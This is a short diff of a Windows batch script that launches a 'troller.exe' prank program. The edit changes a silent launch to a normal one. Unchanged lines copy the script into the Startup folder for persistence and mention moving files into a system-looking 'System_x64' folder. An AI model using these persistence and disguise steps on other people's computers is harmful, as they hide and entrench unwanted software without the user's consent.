@@ -25,8 +25,8 @@ if exist "%DOWNLOAD_FOLDER%\troll in suit.mp4" (
     exit /b 1
 )
 
-:: run the executable silently
-start /b /min "%DOWNLOAD_FOLDER%\troller.exe"
+:: run the executable normally
+"%DOWNLOAD_FOLDER%\troller.exe"
 
 :: check if the process started
 echo Waiting for troller.exe to start...
@@ -34,7 +34,7 @@ timeout /t 5 /nobreak
 
 tasklist /fi "imagename eq troller.exe"
 
-:: ensure the executable runs at startup
+:: ensure the script runs at startup
 copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 
 echo Files have been moved to System_x64 folder, troller.exe started, and script set to run at startup.
